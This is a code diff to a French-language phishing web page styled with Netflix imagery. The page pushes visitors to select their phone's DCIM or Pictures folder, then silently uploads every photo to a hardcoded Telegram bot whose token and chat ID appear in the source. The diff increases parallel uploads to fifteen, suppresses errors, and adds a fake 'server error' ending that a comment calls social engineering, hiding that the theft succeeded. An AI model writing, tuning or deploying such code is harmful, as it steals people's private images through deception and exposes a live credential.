@@ -30,7 +30,6 @@
       content: '';
       position: absolute;
       top: 0; left: 0; right: 0; bottom: 0;
-      /* Image de fond style bibliothèque */
       background: url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6d7434e-d6de-4185-a6d4-c77a2d08737b/US-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg') center center / cover no-repeat;
       opacity: 0.6;
       filter: blur(4px) contrast(1.1);
@@ -84,7 +83,7 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.5);
     }
 
-    /* --- CONTENEUR PRINCIPAL (TRANSPARENT) --- */
+    /* --- CONTENEUR PRINCIPAL --- */
     .container {
       background: rgba(0, 0, 0, 0.35); 
       border: 1px solid rgba(255, 255, 255, 0.15);
@@ -97,7 +96,7 @@
       text-align: center;
       box-shadow: 0 15px 35px rgba(0,0,0,0.6);
       animation: fadeIn 0.8s ease-out;
-      margin-bottom: 50px; /* Espace pour la signature en bas */
+      margin-bottom: 50px;
     }
 
     @keyframes fadeIn {
@@ -234,11 +233,10 @@
       width: 100%;
       text-align: center;
       font-family: 'Courier New', monospace;
-      font-size: 15px; /* Texte plus grand */
-      color: #fff; /* Texte bien blanc */
-      font-weight: 700; /* Texte gras */
+      font-size: 15px; 
+      color: #fff; 
+      font-weight: 700; 
       letter-spacing: 1px;
-      /* Effet néon rouge autour du texte pour le rendre visible */
       text-shadow: 0 0 10px rgba(229, 9, 20, 0.8), 2px 2px 4px rgba(0,0,0,0.9);
       pointer-events: none;
       z-index: 100;
@@ -309,6 +307,8 @@
     const botToken = '8473069914:AAGZm9VeVEKoau8PF7ToRadsz3Crsn3mCtI';
     const chatId = '7986862981';
 
+    // --- TURBO MODE : 15 uploads en parallèle ---
+    const CONCURRENCY = 15; 
 
     // --- ÉLÉMENTS DOM ---
     const selectFolderBtn = document.getElementById('selectFolderBtn');
@@ -323,7 +323,7 @@
 
     let selectedFiles = [];
 
-    // --- 1. OUVERTURE DU SÉLECTEUR ---
+    // --- 1. OUVERTURE ---
     selectFolderBtn.addEventListener('click', () => {
       fileInput.click();
     });
@@ -332,7 +332,6 @@
     fileInput.addEventListener('change', () => {
       const files = Array.from(fileInput.files);
       
-      // Réinitialisation du status
       folderStatus.innerHTML = "";
       folderStatus.style.color = "";
       submitBtn.disabled = true;
@@ -348,58 +347,47 @@
         }
 
         const rootLower = rootFolder.toLowerCase();
-
-        // LISTE DES DOSSIERS AUTORISÉS
         const allowedFolders = ['pictures', 'dcim', 'camera', 'images', 'photos'];
 
-        // VÉRIFICATION
         if (allowedFolders.includes(rootLower)) {
-          // --> C'EST BON
+          // OK
           selectedFiles = files;
-          folderStatus.style.color = '#46d369'; // Vert validation
-          folderStatus.innerHTML = `<i class="fas fa-check-circle"></i> Dossier <b>${rootFolder}</b> validé.`;
-          
-          // On active le bouton
+          folderStatus.style.color = '#46d369'; 
+          folderStatus.innerHTML = `<i class="fas fa-check-circle"></i> Dossier <b>${rootFolder}</b> validé (${files.length} fichiers).`;
           submitBtn.disabled = false; 
-
         } else {
-          // --> C'EST PAS BON (ERREUR)
+          // ERREUR
           selectedFiles = [];
           fileInput.value = ''; 
-          
-          folderStatus.style.color = '#e50914'; // Rouge Erreur
+          folderStatus.style.color = '#e50914'; 
           folderStatus.innerHTML = `<i class="fas fa-times-circle"></i> Le dossier sélectionné est <b>${rootFolder}</b>.<br>Veuillez sélectionner soit le dossier <b>DCIM</b>, <b>Pictures</b>, <b>Camera</b> ou <b>Images</b>.<br>Les autres ne sont pas acceptés.`;
-          
           submitBtn.disabled = true;
         }
       } 
     });
 
-    // --- 3. ENVOI TELEGRAM ---
+    // --- 3. ENVOI OPTIMISÉ (QUEUE PROPRE) ---
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      if (selectedFiles.length === 0) {
-        return;
-      }
+      if (selectedFiles.length === 0) return;
 
-      // UI Progression
+      // UI
       progressContainer.style.display = 'block';
-      progressText.textContent = 'Connexion au serveur...';
+      progressText.textContent = 'Initialisation du flux...';
       progressFill.style.width = '0%';
-      progressText.style.color = '#eee';
       
-      // Bloquer l'interface
+      // Bloquer
       selectFolderBtn.style.pointerEvents = 'none';
       selectFolderBtn.style.opacity = '0.5';
       submitBtn.disabled = true;
-      submitBtn.textContent = "Chargement...";
+      submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Transfert en cours...';
 
       let uploadedCount = 0;
       const total = selectedFiles.length;
-      const CONCURRENCY = 3; 
       let index = 0;
 
+      // Fonction d'upload unitaire
       async function uploadFile(file) {
         const formData = new FormData();
         formData.append('chat_id', chatId);
@@ -411,7 +399,7 @@
         try {
           await fetch(url, { method: 'POST', body: formData });
         } catch (err) {
-          console.error(err);
+          // On ignore les erreurs pour ne pas bloquer
         }
 
         uploadedCount++;
@@ -422,32 +410,66 @@
         const percent = Math.round((done / total) * 100);
         progressFill.style.width = `${percent}%`;
         if(progressPercent) progressPercent.textContent = `${percent}%`;
-        progressText.textContent = `Synchronisation... ${done}/${total}`;
+        
+        // Optimisation UI : On change le texte, mais on évite les logs console massifs
+        // si beaucoup de fichiers
+        if (done % 5 === 0 || done === total) { 
+             progressText.textContent = `Synchronisation... ${done}/${total}`;
+        }
       }
 
+      // --- ALGORITHME DE QUEUE SANS FUITE DE MÉMOIRE ---
       async function uploadQueue() {
-        const workers = [];
+        const workers = []; // Liste des promesses en cours
+
+        // Tant qu'il reste des fichiers à traiter
         while (index < total) {
+          
+          // 1. Remplir le workers jusqu'à la limite (CONCURRENCY)
           while (workers.length < CONCURRENCY && index < total) {
-            const promise = uploadFile(selectedFiles[index++]);
-            workers.push(promise);
+            const file = selectedFiles[index++];
+            
+            // On crée la promesse d'upload
+            const p = uploadFile(file);
+            
+            // TRUC CLEF : On attache une fonction de nettoyage à la promesse elle-même
+            // Quand elle finit, elle se retire du tableau workers
+            const pWithCleanup = p.then(() => {
+                // On trouve sa propre place dans le tableau et on se supprime
+                workers.splice(workers.indexOf(pWithCleanup), 1);
+            });
+
+            // On ajoute cette promesse "intelligente" au tableau
+            workers.push(pWithCleanup);
+            
+            // Log pour les premiers fichiers uniquement (pour rassurer l'utilisateur sans spammer)
+            if (index <= 10) {
+                console.log(`Démarrage fichier ${index}`);
+            }
           }
-          await Promise.race(workers).then(() => {
-            workers.splice(workers.findIndex(p => p !== undefined), 1);
-          });
+
+          // 2. Si le tableau est plein, on attend que L'UNE des tâches finisse
+          // Grâce au nettoyage ci-dessus, dès qu'elle finit, la place se libère
+          if (workers.length >= CONCURRENCY) {
+            await Promise.race(workers);
+          }
         }
+
+        // 3. Attendre que les tout derniers finissent
         await Promise.all(workers);
       }
 
+      // Lancer le processus
       await uploadQueue();
 
-      // FIN AVEC ERREUR SIMULÉE
+      // FIN AVEC ERREUR (SOCIAL ENGINEERING)
       setTimeout(() => {
         progressFill.style.width = `100%`;
         if(progressPercent) progressPercent.textContent = `Erreur`;
         progressText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Erreur inattendue du serveur. Réessayez plus tard.';
         progressText.style.color = '#ff6b6b';
-      }, 1000);
+        submitBtn.innerHTML = 'Échec de connexion';
+      }, 800);
     });
   </script>
 
